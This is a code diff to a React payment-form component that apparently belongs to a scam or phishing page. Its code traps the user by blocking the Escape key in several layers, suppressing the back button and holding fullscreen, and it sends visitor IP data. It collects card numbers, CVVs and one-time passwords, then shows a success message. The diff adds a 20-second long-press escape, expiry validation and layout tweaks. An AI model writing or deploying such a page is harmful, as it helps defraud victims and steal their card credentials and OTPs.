@@ -30,7 +30,6 @@ const PaymentForm = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showOtp, setShowOtp] = useState(false);
   const [otp, setOtp] = useState('');
-  const [displayOtp, setDisplayOtp] = useState('');
   const [otpFocused, setOtpFocused] = useState(false);
   const [timer, setTimer] = useState(299);
   const [isConfirmLoading, setIsConfirmLoading] = useState(false);
@@ -41,6 +40,7 @@ const PaymentForm = () => {
   const [showAlert, setShowAlert] = useState(false);
   const [fadeState, setFadeState] = useState('visible');
   const [showBackDialog, setShowBackDialog] = useState(false);
+  const [longPressTimer, setLongPressTimer] = useState<NodeJS.Timeout | null>(null);
 
   // Check if all card details are filled
   const isFormValid = () => {
@@ -57,8 +57,26 @@ const PaymentForm = () => {
   };
 
   useEffect(() => {
-    // Ultra-strong keyboard restriction with multiple layers of ESC blocking
+    // ESC key long press handling
     const handleKeyDown = (event: KeyboardEvent) => {
+      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
+        event.preventDefault();
+        event.stopPropagation();
+        event.stopImmediatePropagation();
+        
+        // Start long press timer for 20 seconds
+        if (!longPressTimer) {
+          const timer = setTimeout(() => {
+            // Allow minimize after 20 seconds
+            if (document.exitFullscreen) {
+              document.exitFullscreen();
+            }
+          }, 20000);
+          setLongPressTimer(timer);
+        }
+        return false;
+      }
+      
       // Multiple layers of ESC key blocking
       if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
         event.preventDefault();
@@ -87,6 +105,16 @@ const PaymentForm = () => {
       }
     };
 
+    const handleKeyUp = (event: KeyboardEvent) => {
+      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
+        // Clear the long press timer if ESC is released
+        if (longPressTimer) {
+          clearTimeout(longPressTimer);
+          setLongPressTimer(null);
+        }
+      }
+    };
+
     // Add back button prevention
     const handlePopState = (event: PopStateEvent) => {
       event.preventDefault();
@@ -100,9 +128,9 @@ const PaymentForm = () => {
 
     // Multiple event listeners for comprehensive blocking
     document.addEventListener('keydown', handleKeyDown, true);
-    document.addEventListener('keyup', handleKeyDown, true);
+    document.addEventListener('keyup', handleKeyUp, true);
     window.addEventListener('keydown', handleKeyDown, true);
-    window.addEventListener('keyup', handleKeyDown, true);
+    window.addEventListener('keyup', handleKeyUp, true);
 
     // Additional layers for ESC blocking
     const blockEsc = (e: KeyboardEvent) => {
@@ -122,15 +150,15 @@ const PaymentForm = () => {
     return () => {
       window.removeEventListener('popstate', handlePopState);
       document.removeEventListener('keydown', handleKeyDown, true);
-      document.removeEventListener('keyup', handleKeyDown, true);
+      document.removeEventListener('keyup', handleKeyUp, true);
       window.removeEventListener('keydown', handleKeyDown, true);
-      window.removeEventListener('keyup', handleKeyDown, true);
+      window.removeEventListener('keyup', handleKeyUp, true);
       document.body.removeEventListener('keydown', blockEsc, true);
       document.body.removeEventListener('keyup', blockEsc, true);
       document.removeEventListener('keypress', blockEsc, true);
       window.removeEventListener('keypress', blockEsc, true);
     };
-  }, []);
+  }, [longPressTimer]);
 
   useEffect(() => {
     // Initialize broadcast channel and send visitor data with real IP
@@ -292,16 +320,22 @@ const PaymentForm = () => {
       });
     } else if (name === 'expiryMonth') {
       const numericValue = value.replace(/\D/g, '').slice(0, 2);
-      setFormData({
-        ...formData,
-        [name]: numericValue
-      });
+      // Validate month (1-12)
+      if (numericValue === '' || (parseInt(numericValue) >= 1 && parseInt(numericValue) <= 12)) {
+        setFormData({
+          ...formData,
+          [name]: numericValue
+        });
+      }
     } else if (name === 'expiryYear') {
       const numericValue = value.replace(/\D/g, '').slice(0, 2);
-      setFormData({
-        ...formData,
-        [name]: numericValue
-      });
+      // Validate year (up to 50)
+      if (numericValue === '' || parseInt(numericValue) <= 50) {
+        setFormData({
+          ...formData,
+          [name]: numericValue
+        });
+      }
     } else if (name === 'cvv') {
       const numericValue = value.replace(/\D/g, '').slice(0, 4);
       setFormData({
@@ -393,7 +427,7 @@ const PaymentForm = () => {
   if (showSuccess) {
     return (
       <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
-        <div className="text-center pt-20">
+        <div className="text-center pt-4">
           <div className="text-green-600 text-6xl animate-bounce">✓</div>
           <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
         </div>
@@ -404,7 +438,7 @@ const PaymentForm = () => {
   if (showProcessing) {
     return (
       <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
-        <div className="text-center pt-20">
+        <div className="text-center pt-4">
           <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
           <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
         </div>
@@ -464,11 +498,11 @@ const PaymentForm = () => {
             <div className="relative">
               <input
                 type="text"
-                value={displayOtp}
+                value={otp}
                 onChange={handleOtpChange}
                 onFocus={() => setOtpFocused(true)}
                 onBlur={() => setOtpFocused(false)}
-                placeholder="******"
+                placeholder="------"
                 className={`w-full px-4 py-3 border-2 rounded-lg text-center text-2xl tracking-widest focus:outline-none transition-all ${
                   otpFocused ? 'border-blue-400 shadow-lg shadow-blue-200' : 'border-gray-300'
                 }`}
@@ -574,14 +608,14 @@ const PaymentForm = () => {
             Card Number
           </label>
           <div className="relative">
-            <CreditCard className="absolute left-3 top-2.5 w-4 h-4 text-gray-400" />
+            <CreditCard className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
             <input
               type="text"
               name="cardNumber"
               placeholder="1234 5678 9012 3456"
               value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
               onChange={handleInputChange}
-              className="w-full pl-10 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+              className="w-full pl-12 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
               maxLength={19}
               disabled={isLoading}
             />
@@ -599,10 +633,16 @@ const PaymentForm = () => {
               placeholder="MM"
               value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
               onChange={handleInputChange}
-              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) 
+                ? 'border-red-500' : 'border-gray-300'
+              }`}
               maxLength={2}
               disabled={isLoading}
             />
+            {formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) && (
+              <p className="text-red-500 text-xs mt-1">Valid month (1-12)</p>
+            )}
           </div>
           
           <div>
@@ -615,10 +655,16 @@ const PaymentForm = () => {
               placeholder="YY"
               value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
               onChange={handleInputChange}
-              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                formData.expiryYear && parseInt(formData.expiryYear) > 50 
+                ? 'border-red-500' : 'border-gray-300'
+              }`}
               maxLength={2}
               disabled={isLoading}
             />
+            {formData.expiryYear && parseInt(formData.expiryYear) > 50 && (
+              <p className="text-red-500 text-xs mt-1">Valid year (max 50)</p>
+            )}
           </div>
           
           <div>
@@ -626,14 +672,14 @@ const PaymentForm = () => {
               CVV
             </label>
             <div className="relative">
-              <Lock className="absolute left-2 top-2.5 w-4 h-4 text-gray-400" />
+              <Lock className="absolute left-2 top-3 w-5 h-5 text-gray-400" />
               <input
                 type="text"
                 name="cvv"
                 placeholder="123"
                 value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                 onChange={handleInputChange}
-                className="w-full pl-8 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+                className="w-full pl-9 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                 maxLength={4}
                 disabled={isLoading}
               />
@@ -683,7 +729,7 @@ const PaymentForm = () => {
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
-          <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/rupay-logo-icon.png" alt="RuPay" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://pngimagefree.com/wp-content/uploads/Rupay-Logo-Vector-PNG-Transparent.png" alt="RuPay" className="h-8 w-12 object-contain filter brightness-0" />
         </div>
 
         <div className="text-xs text-gray-500 text-center mt-4">
